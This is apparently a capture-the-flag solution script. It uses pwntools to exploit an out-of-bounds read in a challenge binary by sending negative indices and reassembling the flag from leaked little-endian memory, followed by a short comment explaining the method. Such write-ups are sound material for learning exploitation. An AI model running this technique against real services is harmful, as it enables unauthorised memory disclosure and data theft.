from pwn import *
from grwnapy.pwn import find_offset


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

flag = b""
offset = 1
while b"pwn" not in flag:
    io = start()
    io.sendlineafter(b'like to view?', b"-" + str(offset).encode())
    io.recvuntil(b"hacker number is ")
    cand = io.recvuntil(b"\n")[:-1]
    flag = unhex(cand)[::-1] + flag
    offset += 1
print(flag)


"""
This one seems a bit bruteforce-y but actually, you can start with a higher offset
The idea is to find at which negative offset the flag is, you can calculate manually by looking at the decompiled code, but why not script it?
Since the values are stored in little endian we have to reverse the resulting string first
"""